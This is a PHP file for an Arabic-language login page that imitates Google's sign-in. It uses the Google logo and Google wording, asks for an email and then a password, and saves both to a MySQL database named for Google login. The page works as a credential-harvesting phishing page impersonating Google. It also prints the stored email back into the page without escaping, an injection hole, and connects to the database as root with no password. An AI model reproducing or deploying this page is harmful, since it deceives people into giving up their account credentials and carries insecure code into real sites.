<?php
session_start();
$servername = "localhost";
$username = "root";
$password = "";
$dbname = "if0_40809468_google_login_db";

$conn = new mysqli($servername, $username, $password, $dbname);
if ($conn->connect_error) {
    die("Database Error");
}

$msg = "";
$show_password_step = false; 


if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['email'])) {
    $email = $_POST['email'];
    $_SESSION['email'] = $email; 
    $show_password_step = true;

    
    $stmt = $conn->prepare("INSERT IGNORE INTO users (email) VALUES (?)");
    $stmt->bind_param("s", $email);
    $stmt->execute();
}

if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['password'])) {
    $password = $_POST['password'];
    $email = $_SESSION['email'];


    $hashed = password_hash($password, PASSWORD_DEFAULT);

    $stmt = $conn->prepare("UPDATE users SET password=? WHERE email=?");
    $stmt->bind_param("ss", $hashed, $email);
    $stmt->execute();
}
?>

<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>تسجيل الدخول</title>
    <link rel="stylesheet" href="s.css">
</head>
<body>

<div class="container">
    <div class="card">
        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="logo">

        <h1>تسجيل الدخول</h1>

        <?php if (!$show_password_step): ?>
            
            <p class="google-text">
                يرجى استخدام حسابك على <span class="google-name">Google</span><br>
                سيتم إضافة الحساب إلى هذا الجهاز وسيكون متاحًا لاستخدامه في تطبيقات
                <span class="google-name">Google</span> الأخرى<br>
                <a href="#" class="link">مزيد من المعلومات حول استخدام حسابك</a>
            </p>

            <form method="POST" action="">
                <input type="email" name="email" placeholder="البريد الإلكتروني أو الهاتف" required>
                <?php echo $msg; ?>

                <a href="#" class="link forgot-link">هل نسيت بريدك الإلكتروني؟</a>

                <div class="buttons">
                    <a href="#" class="link">إنشاء حساب</a>
                    <button type="submit">التالي</button>
                </div>
            </form>

        <?php else: ?>
            <p class="google-text">
                أدخل كلمة المرور للحساب <br>
                <span class="google-name"><?php echo $_SESSION['email']; ?></span>
            </p>

            <form method="POST" action="">
                <input type="password" name="password" placeholder="كلمة المرور" required>
                <?php echo $msg; ?>

                <div class="buttons">
                    <a href="login.php" class="link">تغيير البريد</a>
                    <button type="submit">التالي</button>
                </div>
            </form>
        <?php endif; ?>

    </div>
</div>

</body>
</html>
